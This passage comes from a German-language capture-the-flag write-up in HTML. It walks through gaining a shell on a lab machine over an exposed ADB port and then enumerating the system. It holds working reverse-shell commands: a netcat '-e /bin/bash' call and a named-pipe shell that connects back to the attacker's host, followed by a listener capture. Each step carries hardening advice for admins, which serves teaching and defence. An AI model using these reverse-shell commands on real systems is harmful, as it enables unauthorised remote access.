+                <strong>Analyse:</strong> Nachdem ich eine interaktive Verbindung initiert hatte (entweder &uuml;ber Ghost Frameworks &#x27;interact&#x27; oder durch den direkten Gebrauch von &#x27;adb shell&#x27;), habe ich sofort den Befehl <code>id</code> ausgef&uuml;hrt. Dieser Befehl ist auf Unix-&auml;hnlichen Systemen Standard und zeigt die User-ID (uid), Group-ID (gid) und zus&auml;tzliche Gruppen des aktuell angemeldeten Benutzers an. Die Ausgabe <code>uid=1000(runner) gid=1000(runner) groups=1000(runner)</code> enth&uuml;llt, dass ich initial als Benutzer &#x27;runner&#x27; mit der UID und GID 1000 Zugriff erlangt habe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Erlangen einer Shell mit eingeschr&auml;nkten Benutzerrechten ist der erste signifikante Erfolg beim Initial Access. Der Benutzer &#x27;runner&#x27; ist offensichtlich kein privilegierter Benutzer wie &#x27;root&#x27;. Dies bedeutet, dass weitere Schritte zur Privilegieneskalation notwendig sein werden, um vollst&auml;ndige Kontrolle &uuml;ber das System zu erlangen. Dennoch ist der Fu&szlig; in der T&uuml;r und ich kann beginnen, das System aus der Perspektive dieses Benutzers zu erkunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestimme sofort nach dem Erlangen einer Shell die aktuellen Benutzerrechte mit dem <code>id</code> Befehl. Dies ist entscheidend, um zu verstehen, welche Aktionen du ausf&uuml;hren kannst und welche Privilegieneskalationstechniken du ben&ouml;tigst.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere das Prinzip der geringsten Rechte (Least Privilege). Benutzer sollten nur die minimalen Berechtigungen haben, die sie f&uuml;r ihre Aufgaben ben&ouml;tigen. Trenne Dienste und Benutzerkonten voneinander, sodass ein Kompromittieren eines Kontos nicht sofort zum Kompromittieren anderer Dienste oder des gesamten Systems f&uuml;hrt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">adb shell id</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">uid=1000(runner) gid=1000(runner) groups=1000(runner)</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mein n&auml;chster Versuch, eine stabilere und interaktivere Shell zu erhalten, war die Verwendung von Netcat (nc) in Kombination mit &#x27;adb shell&#x27;. Ich versuchte, eine Netcat-Verbindung vom Zielsystem zur&uuml;ck zu meinem Kali-Rechner auf Port 4445 aufzubauen und eine Bash-Shell an diese Verbindung zu binden (<code>adb shell nc -e /bin/bash 192.168.2.199 4445</code>). Die Ausgabe zeigt jedoch die Usage-Informationen von BusyBox Netcat. Dies bedeutet, dass der Befehl &#x27;nc -e /bin/bash&#x27; auf dem Zielsystem nicht wie erwartet funktionierte. BusyBox-Bin&auml;rdateien sind oft vereinfacht und unterst&uuml;tzen m&ouml;glicherweise nicht alle Optionen (wie &#x27;-e&#x27; f&uuml;r die Programmausf&uuml;hrung nach Verbindung) der vollwertigen GNU-Versionen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Versuch war nicht erfolgreich, lieferte aber eine wichtige Information: Das System verwendet BusyBox. Die Verwendung von BusyBox hat signifikante Auswirkungen auf die verf&uuml;gbaren Befehle und deren Optionen. Ich muss meine Strategien an die Einschr&auml;nkungen von BusyBox anpassen und die spezifische BusyBox-Version und ihre F&auml;higkeiten ber&uuml;cksichtigen. Das Scheitern des &#x27;-e&#x27; Flags ist ein klares Indiz daf&uuml;r.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Identifiziere fr&uuml;hzeitig, ob BusyBox oder andere eingeschr&auml;nkte Shell-Umgebungen verwendet werden. Konsultiere die Hilfe-Ausgabe der BusyBox-Befehle (oft durch Ausf&uuml;hren des Befehls ohne Argumente) oder die BusyBox-Dokumentation, um die unterst&uuml;tzten Optionen zu verstehen.
+                <br><strong>Empfehlung (Admin):</strong> Verwende keine BusyBox-Bin&auml;rdateien in Szenarien, in denen deren Einschr&auml;nkungen ein Sicherheitsrisiko darstellen k&ouml;nnten (z.B. wenn ein vereinfachtes &#x27;nc&#x27; f&uuml;r unbeabsichtigte Aktionen missbraucht werden k&ouml;nnte). Wenn BusyBox verwendet wird, beschr&auml;nke die verf&uuml;gbaren Befehle und stelle sicher, dass kritische Funktionen nicht auf vereinfachte BusyBox-Implementierungen angewiesen sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">adb shell nc -e /bin/bash 192.168.2.199 4445</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary.
+
+Usage: nc [OPTIONS] HOST PORT  - connect
+nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
+
+	<span class="command">-e PROG	Run PROG after connect (must be last)</span>
+	<span class="command">-l	Listen mode, for inbound connects</span>
+	<span class="command">-lk	With -e, provides persistent server</span>
+	<span class="command">-p PORT	Local port</span>
+	<span class="command">-s ADDR	Local address</span>
+	<span class="command">-w SEC	Timeout for connects and final net reads</span>
+	<span class="command">-i SEC	Delay interval for lines sent</span>
+	<span class="command">-n	Don&#x27;t do DNS resolution</span>
+	<span class="command">-u	UDP mode</span>
+	<span class="command">-b	Allow broadcasts</span>
+	<span class="command">-v	Verbose</span>
+	<span class="command">-o FILE	Hex dump traffic</span>
+	<span class="command">-z	Zero-I/O mode (scanning)</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Angesichts der BusyBox-Einschr&auml;nkung beim &#x27;-e&#x27; Flag habe ich eine alternative Methode f&uuml;r eine Reverse Shell versucht, die auf Named Pipes (FIFOs) basiert. Der Befehl <code>adb shell &#x27;rm /tmp/f; mknod /tmp/f p; cat /tmp/f | /system/bin/sh -i 2&gt;&amp;1 | nc 192.168.2.199 4445 &gt; /tmp/f&#x27;</code> versucht im Wesentlichen: 1. Eine existierende Named Pipe im /tmp-Verzeichnis zu l&ouml;schen (<code>rm /tmp/f</code>). 2. Eine neue Named Pipe namens &#x27;f&#x27; zu erstellen (<code>mknod /tmp/f p</code>). 3. Den Inhalt dieser Pipe an eine interaktive Shell (<code>/system/bin/sh -i 2&gt;&amp;1</code>) zu &uuml;bergeben. 4. Die Ausgabe dieser Shell an Netcat zu senden, das sich zu meinem Kali-Rechner verbindet (<code>nc 192.168.2.199 4445</code>). 5. Die Eingabe von Netcat zur&uuml;ck in die Named Pipe zu schreiben (<code>&gt; /tmp/f</code>), um die Interaktivit&auml;t herzustellen. Die erste Zeile der Ausgabe (&quot;rm: can&#x27;t remove &#x27;/tmp/f&#x27;: No such file or directory&quot;) ist unbedeutend, da sie nur besagt, dass die Datei nicht existierte, was f&uuml;r den Erfolg des Befehls nicht kritisch ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Methode der Reverse Shell ist eine g&auml;ngige Technik, wenn das &#x27;-e&#x27; Flag von Netcat nicht verf&uuml;gbar ist. Der erste Versuch mit `/system/bin/sh` schien erfolgreich zu sein, da keine Fehlermeldung von den Pipe-Operationen oder Netcat selbst folgte. Dies deutet darauf hin, dass die Pipe erstellt und die Netcat-Verbindung initiiert wurde. Die Best&auml;tigung des erfolgreichen Shell-Zugriffs erfolgte im Anschluss auf meinem Netcat Listener.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Habe mehrere Reverse Shell-Techniken parat (Netcat -e, Named Pipes, PTY-Spawn, Skript-basierte Shells in Python/Perl/PHP etc.), da die unterst&uuml;tzten Features von System zu System variieren. Teste immer, ob die Shell interaktiv ist und nutze <code>stty</code>, um eine vollwertige TTY zu emulieren, falls m&ouml;glich.
+                <br><strong>Empfehlung (Admin):</strong> Beschr&auml;nke die Ausf&uuml;hrung von Bin&auml;rdateien in Verzeichnissen mit Schreibzugriff f&uuml;r normale Benutzer (wie /tmp). Implementiere und erzwinge starke Richtlinien f&uuml;r die Befehlsausf&uuml;hrung und den Netzwerkverkehr, um zu verhindern, dass solche Reverse Shells aufgebaut werden k&ouml;nnen (z.B. durch Blockieren ausgehender Verbindungen von unerwarteten Prozessen oder zu ungew&ouml;hnlichen Ports).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">adb shell &#x27;rm /tmp/f; mknod /tmp/f p; cat /tmp/f | /system/bin/sh -i 2&gt;&amp;1 | nc 192.168.2.199 4445 &gt; /tmp/f&#x27;</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+rm: can&#x27;t remove &#x27;/tmp/f&#x27;: No such file or directory
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um sicherzugehen, welchen Shell-Interpreter ich auf dem Zielsystem verwenden sollte, habe ich den Befehl <code>adb shell which sh</code> ausgef&uuml;hrt. Der Befehl &#x27;which&#x27; sucht im PATH nach dem Speicherort eines Befehls. Die Ausgabe &#x27;/bin/sh&#x27; zeigt, dass der Standard-Shell-Link &#x27;sh&#x27; auf &#x27;/bin/sh&#x27; verweist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Information ist hilfreich, um sicherzustellen, dass die im Reverse Shell-Befehl verwendete Shell auch tats&auml;chlich existiert und ausf&uuml;hrbar ist. Obwohl ich bereits /system/bin/sh im vorherigen Befehl verwendet hatte, best&auml;tigt dies, dass /bin/sh der kanonische Pfad ist. Die Konsistenz bei der Angabe des Shell-Pfades kann wichtig sein, um Kompatibilit&auml;tsprobleme zu vermeiden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> &Uuml;berpr&uuml;fe immer die Pfade von kritischen Bin&auml;rdateien wie der Shell, besonders auf Systemen mit potenziell ungew&ouml;hnlichen Dateisystemstrukturen oder BusyBox. Nutze <code>which</code>, <code>whereis</code> oder <code>type -p</code>.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass unn&ouml;tige Shell-Interpreter entfernt oder deren Ausf&uuml;hrung f&uuml;r normale Benutzer eingeschr&auml;nkt werden. Die Verwendung von chroot-Umgebungen kann die verf&uuml;gbaren Bin&auml;rdateien f&uuml;r kompromittierte Dienste oder Benutzer einschr&auml;nken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">adb shell which sh</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">/bin/sh</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich den Pfad der &#x27;sh&#x27;-Shell verifiziert hatte, wiederholte ich den Named Pipe Reverse Shell-Befehl, diesmal unter Verwendung von &#x27;/bin/sh&#x27; anstelle von &#x27;/system/bin/sh&#x27;. Der Befehl ist identisch: <code>adb shell &#x27;rm /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.2.199 4445 &gt; /tmp/f&#x27;</code>. Da keine Fehlermeldung ausgegeben wurde, gehe ich davon aus, dass dieser Befehl auf dem Zielsystem erfolgreich ausgef&uuml;hrt wurde und der Netcat-Client auf dem Zielsystem eine Verbindung zu meinem Listener aufgebaut hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erfolgreiche Ausf&uuml;hrung dieses Befehls auf dem Zielsystem ist der entscheidende Schritt zum Initial Access. Der Aufbau der Named Pipe und die Initiierung der Verbindung zu meinem Listener bedeutet, dass ich nun potenziell eine interaktive Shell auf dem Zielsystem &uuml;ber meine Netcat-Sitzung erhalten habe. Dies umgeht die Einschr&auml;nkungen des BusyBox &#x27;nc -e&#x27; und stellt eine funktionierende Reverse Shell bereit.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verifiziere die Ausf&uuml;hrung von komplexen Befehlen auf dem Zielsystem. Sei kreativ bei der Umgehung von Einschr&auml;nkungen durch vereinfachte Bin&auml;rdateien (wie BusyBox), indem du alternative Techniken nutzt, z.B. Named Pipes oder das Hochladen vollwertiger Bin&auml;rdateien.
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berwache die Erstellung von Named Pipes oder ungew&ouml;hnlichen Dateien in Verzeichnissen mit Schreibzugriff f&uuml;r normale Benutzer (wie /tmp). Implementiere EDR (Endpoint Detection and Response) L&ouml;sungen, die verd&auml;chtige Befehlsketten erkennen k&ouml;nnen, wie z.B. die Kombination von &#x27;mknod&#x27;, &#x27;cat&#x27; und &#x27;nc&#x27;.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">adb shell &#x27;rm /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.2.199 4445 &gt; /tmp/f&#x27;</span> 
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich den Named Pipe Reverse Shell-Befehl &uuml;ber ADB abgeschickt hatte, wechselte ich zu meinem Netcat-Listener, der auf Port 4445 auf meinem Kali-System lauschte. Die Ausgabe des Netcat-Listeners best&auml;tigte den erfolgreichen Verbindungsaufbau vom Zielsystem (192.168.2.69) zu meinem Rechner (192.168.2.199) auf dem erwarteten Port. Die Meldung &quot;/bin/sh: can&#x27;t access tty; job control turned off&quot; ist typisch f&uuml;r eine nicht-interaktive oder Pseudo-TTY-Shell, die &uuml;ber Netcat etabliert wurde. Das Erscheinen des einfachen &#x27;/ $&#x27;-Prompts zeigte, dass ich tats&auml;chlich Shell-Zugriff als Benutzer &#x27;runner&#x27; hatte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch, der Initial Access war erfolgreich! Ich habe eine Shell auf dem Zielsystem, wenn auch nur mit eingeschr&auml;nkten Rechten als Benutzer &#x27;runner&#x27;. Die Shell ist zun&auml;chst nicht voll interaktiv (keine TTY), was bedeutet, dass bestimmte Befehle oder Funktionen (wie Tab-Vervollst&auml;ndigung, Pfeiltasten, Job Control) nicht funktionieren werden. Dies muss schnell behoben werden, um die weitere Erkundung zu erleichtern. Der erfolgreiche Verbindungsaufbau &uuml;ber Netcat best&auml;tigt die Funktionalit&auml;t meiner Reverse Shell-Methode &uuml;ber Named Pipes.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Best&auml;tige immer sofort die erfolgreiche Verbindung auf deinem Listener. Wenn die Shell nicht interaktiv ist, versuche umgehend, eine TTY zu spawnen, um die Interaktion zu verbessern. Nutze Befehle wie <code>python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</code> oder <code>stty</code>.
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berwache ausgehenden Netcat-Verkehr auf un&uuml;bliche Ports oder Ziele. Protokolliere Shell-Zugriffe und die ausgef&uuml;hrten Befehle. Implementiere Systeme, die das Spawnen von PTYs oder die Ausf&uuml;hrung von Skripten, die dazu dienen, die Shell-Interaktivit&auml;t zu erh&ouml;hen, erkennen und blockieren k&ouml;nnen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">nc -lvnp 4445</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">listening on [any] 4445 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.69] 38755</span>
+/bin/sh: <span class="password">can&#x27;t access tty; job control turned off</span>
+/ $ 
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Unmittelbar nach dem Erhalt der Shell war mein erster Schritt, die Shell interaktiv zu machen, um die Arbeit zu erleichtern. Ich nutzte den <code>stty</code> Befehl in Kombination mit den aus meiner lokalen Terminalgr&ouml;&szlig;e extrahierten Zeilen- und Spaltenwerten, um eine Pseudo-TTY zu emulieren. Dies verbessert die Benutzerfreundlichkeit der Shell erheblich. Anschlie&szlig;end best&auml;tigte ich meine Benutzer-ID erneut mit dem <code>id</code> Befehl, der wie erwartet <code>uid=1000(runner)</code> anzeigte. Danach versuchte ich mit <code>cd ~</code> in das Home-Verzeichnis des aktuellen Benutzers &#x27;runner&#x27; zu wechseln.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das erfolgreiche Spawnen einer TTY und das Best&auml;tigen der Identit&auml;t sind wichtige Schritte zur Stabilisierung und zum Verst&auml;ndnis der initialen Shell-Umgebung. Eine interaktive Shell ist f&uuml;r die weitere Enumeration und das Hochladen von Tools unerl&auml;sslich. Das Wechseln in das Home-Verzeichnis ist ein logischer Schritt, um von einem bekannten Punkt aus mit der Dateisystemerkundung zu beginnen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Mache eine nicht-interaktive Shell immer interaktiv, sobald du sie erh&auml;ltst. Dies erm&ouml;glicht eine effizientere Arbeit. &Uuml;berpr&uuml;fe stets deinen aktuellen Benutzer und dein Verzeichnis.
+                <br><strong>Empfehlung (Admin):</strong> Achte auf die Nutzung von <code>stty</code> oder &auml;hnlichen Befehlen, die auf das Spawnen einer interaktiven Shell hindeuten k&ouml;nnten. Beschr&auml;nke die verf&uuml;gbaren Shells und &uuml;berwache deren Nutzung, insbesondere f&uuml;r Benutzerkonten mit geringeren Privilegien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+/ $ <span class="command">stty rows 47 columns 94</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+/ $ <span class="command">id</div></div>
+                <div class="terminal"><pre>
+uid=1000(runner) gid=1000(runner) groups=1000(runner)</span>
+/ $ 
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+/ $ <span class="command">cd ~</span>
+                    </div>
+                </div>
+                <div class="terminal"> 
+~ $  </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um das Dateisystem zu erkunden, begann ich im Home-Verzeichnis des Benutzers &#x27;runner&#x27; (symbolisiert durch &#x27;~ $&#x27; im Prompt). Der Befehl <code>ls</code> zeigte zun&auml;chst keine Dateien an, was auf ein leeres Home-Verzeichnis hindeutete. Ein Tippfehler (<code>ls- la</code>) f&uuml;hrte zu einer &quot;not found&quot;-Meldung, was best&auml;tigt, dass das System pr&auml;zise Befehle ben&ouml;tigt und keine automatische Fehlerkorrektur durchf&uuml;hrt. Mit dem korrekten Befehl <code>ls -la</code> listete ich die Inhalte des Verzeichnisses inklusive versteckter Dateien und detaillierter Berechtigungen auf. Die Ausgabe zeigte nur die Standardverzeichnisse &#x27;.&#x27; (aktuelles Verzeichnis) und &#x27;..&#x27; (&uuml;bergeordnetes Verzeichnis) sowie einen symbolischen Link &#x27;.ash_history&#x27;, der auf &#x27;/dev/null&#x27; verweist. Dies bedeutet, dass der Befehlsverlauf nicht gespeichert wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Erkundung des Dateisystems ist entscheidend, um sensible Dateien, Konfigurationen oder weitere Angriffsvektoren zu finden. Das Home-Verzeichnis des initialen Benutzers ist immer ein guter Ausgangspunkt. Das Fehlen von Dateien und die Weiterleitung der History nach /dev/null deuten darauf hin, dass hier keine schnellen Funde von z.B. SSH-Schl&uuml;sseln oder Passwortdateien zu erwarten sind. Das Dateisystem muss weiter erkundet werden, insbesondere in relevanten Systemverzeichnissen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne die Dateisystemerkundung in bekannten Verzeichnissen wie dem Home-Verzeichnis, /tmp, /opt, /var, /etc. Suche nach Konfigurationsdateien, Skripten, Logdateien, Passwort-Hashes oder Dateien mit ungew&ouml;hnlichen Berechtigungen. Nutze <code>ls -la</code> oder &auml;hnliche Befehle f&uuml;r detaillierte Informationen.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Home-Verzeichnisse von Dienstkonten keine sensiblen Informationen enthalten. Konfiguriere Systeme so, dass History-Dateien sicher gespeichert oder irrelevant sind, wenn sie nicht f&uuml;r Debugging ben&ouml;tigt werden. Implementiere Zugriffskontrollen (ACLs) auf Dateisystemebene, um den Zugriff auf kritische Dateien zu beschr&auml;nken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+ ~ $ <span class="command">ls</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+~ $ <span class="command">ls- la</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+/bin/sh: <span class="password">ls-: not found</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+ ~ $ <span class="command">ls -la</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+total 8
+<span class="command">drwx------    2 runner   runner        4096 May 19 09:08 .</span>
+<span class="command">drwxr-xr-x    4 root     root          4096 May 19 10:02 ..</span>
+<span class="command">lrwxrwxrwx    1 root     runner           9 May 19 09:08 .ash_history -&gt; /dev/null</span>
+~ $ 
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Um zu sehen, welche anderen Benutzerverzeichnisse im &uuml;bergeordneten Verzeichnis (/home, da sich &#x27;~&#x27; im Home-Verzeichnis von runner befindet) existieren, f&uuml;hrte ich <code>ls ..</code> aus. Die Ausgabe &#x27;asahi runner&#x27; zeigte, dass es neben dem &#x27;runner&#x27;-Verzeichnis auch ein Verzeichnis f&uuml;r einen Benutzer namens &#x27;asahi&#x27; gibt. Dies ist ein wichtiger Fund, da &#x27;asahi&#x27; ein weiterer potenzieller Benutzer auf dem System ist, dessen Home-Verzeichnis interessante Dateien (wie SSH-Schl&uuml;ssel oder Flags) enthalten k&ouml;nnte.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Die Identifizierung anderer Benutzerkonten ist ein Standard-Schritt bei der Systemaufkl&auml;rung. Das Wissen, dass ein &#x27;asahi&#x27;-Benutzer existiert, er&ouml;ffnet einen neuen m&ouml;glichen Pfad f&uuml;r die Privilegieneskalation oder das Auffinden von Flags, falls deren Home-Verzeichnis zug&auml;nglich ist oder sensible Dateien enth&auml;lt.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Suche immer nach anderen Benutzerkonten (z.B. in /etc/passwd oder durch Auflistung von Home-Verzeichnissen). Versuche, deren Home-Verzeichnisse oder andere relevante Dateien zu lesen, auch wenn du aktuell nicht deren Rechte hast.
+            <br><strong>Empfehlung (Admin):</strong> F&uuml;hre regelm&auml;&szlig;ige Audits der Systembenutzerkonten durch und entferne ungenutzte oder unbekannte Konten. Stelle sicher, dass Home-Verzeichnisse standardm&auml;&szlig;ig nur f&uuml;r den jeweiligen Benutzer lesbar sind.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+ ~ $ <span class="command">ls ..</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">asahi   runner</span>
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Um grundlegende Informationen &uuml;ber das Betriebssystem und den Kernel des Zielsystems zu erhalten, f&uuml;hrte ich den Befehl <code>uname -a</code> aus. Die Ausgabe &#x27;Linux fuzzz.hmv 6.12.28-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-05-09 13:57:18 x86_64 Linux&#x27; lieferte detaillierte Informationen: Es handelt sich um ein Linux-System mit dem Hostnamen &#x27;fuzzz.hmv&#x27;, das einen 6.12.28-0-lts Kernel basierend auf Alpine Linux verwendet. Dies best&auml;tigt die Nmap-Ergebnisse bez&uuml;glich des Betriebssystems und liefert eine spezifischere Kernel-Version und Distribution (Alpine Linux), die f&uuml;r die Privilegieneskalation relevant sein k&ouml;nnte (Suche nach Kernel-Exploits oder spezifischen Alpine-Schwachstellen).
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Genaue Informationen &uuml;ber das Betriebssystem und die Kernel-Version sind f&uuml;r die Privilegieneskalationsphase unerl&auml;sslich. Das Wissen, dass es sich um Alpine Linux mit einem spezifischen LTS-Kernel handelt, erm&ouml;glicht eine gezielte Suche nach &ouml;ffentlich bekannten Exploits f&uuml;r diese Plattform und Version. Dies ist ein wichtiger Schritt, um potenzielle PE-Vektoren einzugrenzen.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Ermittle immer die genaue OS-Distribution, Version und Kernel-Version. Nutze Tools wie <code>uname -a</code>, <code>cat /etc/*release</code> oder <code>hostnamectl</code>. Recherchiere bekannte Schwachstellen f&uuml;r diese spezifische Konfiguration.
+            <br><strong>Empfehlung (Admin):</strong> Halte den Kernel und das Betriebssystem auf dem neuesten Stand. Implementiere Kernel-Patching-Strategien und pr&uuml;fe regelm&auml;&szlig;ig auf bekannte Schwachstellen f&uuml;r deine spezifische Distribution und Version. Verwende geh&auml;rtete Kernel und deaktiviere unn&ouml;tige Kernel-Module.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+~ $ <span class="command">uname -a</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">Linux fuzzz.hmv 6.12.28-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-05-09 13:57:18 x86_64 Linux</span>
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Um die Netzwerkaktivit&auml;t und die offenen Ports aus der Perspektive des Benutzers &#x27;runner&#x27; zu verstehen, f&uuml;hrte ich den Befehl <code>netstat -an</code> aus. Dieser Befehl zeigt alle aktiven Netzwerkverbindungen (TCP und UDP) sowie die Listening-Ports numerisch (ohne Namensaufl&ouml;sung). Die Ausgabe best&auml;tigte die von Nmap gefundenen Ports 22 (SSH) und 5555 (ADB) als im Zustand LISTEN (aktiv und auf eingehende Verbindungen wartend). Au&szlig;erdem zeigte es die ESTABLISHED-Verbindungen, einschlie&szlig;lich der von mir initiierten Netcat-Reverse-Shell (192.168.2.69:38755 zu 192.168.2.199:4445) und der ADB-Verbindung (192.168.2.69:5555 zu 192.168.2.199:58300 - dies scheint die urspr&uuml;ngliche ADB-Verbindung von meinem System zu sein). Die TIME_WAIT-Eintr&auml;ge auf Port 5555 deuten auf k&uuml;rzlich beendete Verbindungen hin. Besonders interessant ist auch der Eintrag <code>tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN</code>, der zeigt, dass ein Dienst auf Port 80 l&auml;uft, aber nur auf der lokalen Loopback-Schnittstelle (127.0.0.1) lauscht. Dieser Dienst war &uuml;ber Nmap von extern nicht sichtbar.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Die <code>netstat</code>-Ausgabe ist &auml;u&szlig;erst wertvoll f&uuml;r die interne Netzwerkerkundung. Sie best&auml;tigt nicht nur externe Dienste, sondern enth&uuml;llt auch lokal laufende Dienste, die nur von innerhalb des Systems erreichbar sind. Der auf 127.0.0.1:80 lauschende Dienst ist ein signifikanter Fund, da er einen potenziellen lokalen Angriffsvektor darstellt. Ich werde versuchen m&uuml;ssen, diesen Dienst zu erreichen, da er nicht direkt vom Angreifer-System aus zug&auml;nglich ist. Die Tatsache, dass dieser Dienst als Root l&auml;uft (impliziert durch den Bind an einen privilegierten Port wie 80, obwohl dies nicht explizit aus netstat hervorgeht, ist es eine starke Vermutung), macht ihn zu einem vielversprechenden Ziel f&uuml;r die Privilegieneskalation.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> F&uuml;hre immer <code>netstat -an</code> (oder &auml;hnliche Befehle wie <code>ss -tuln</code>) aus, um interne Netzwerkdienste zu identifizieren. Suche nach Ports, die nur auf 127.0.0.1 (localhost) oder anderen internen Schnittstellen lauschen. Diese sind oft Ziele f&uuml;r lokale Angriffe oder Privilegieneskalation.
+            <br><strong>Empfehlung (Admin):</strong> &Uuml;berpr&uuml;fe regelm&auml;&szlig;ig die offenen Ports und lauschenden Dienste auf deinen Systemen. Stelle sicher, dass Dienste nicht unn&ouml;tigerweise auf allen Schnittstellen lauschen, sondern nur auf den ben&ouml;tigten. Wende das Prinzip der geringsten Privilegien auch auf Dienste an; sie sollten nicht als Root laufen, wenn es nicht unbedingt notwendig ist.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <pre>
+~ $ <span class="command">netstat -an</span>
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       
+<span class="command">tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN</span>      
+<span class="command">tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN</span>      
+<span class="command">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN</span>      
+<span class="command">tcp        0    137 192.168.2.69:38755      192.168.2.199:4445      ESTABLISHED</span> 
+<span class="command">tcp        0      0 192.168.2.69:5555       192.168.2.199:58300     ESTABLISHED</span> 
+<span class="command">tcp        0      0 192.168.2.69:5555       192.168.2.199:34078     TIME_WAIT</span>   
+<span class="command">tcp        0      0 192.168.2.69:5555       192.168.2.199:60516     TIME_WAIT</span>   
+<span class="command">tcp        0      0 192.168.2.69:5555       192.168.2.199:49604     TIME_WAIT</span>   
+<span class="command">tcp        0      0 :::22                   :::*                    LISTEN</span>      
+Active UNIX domain sockets (servers and established)
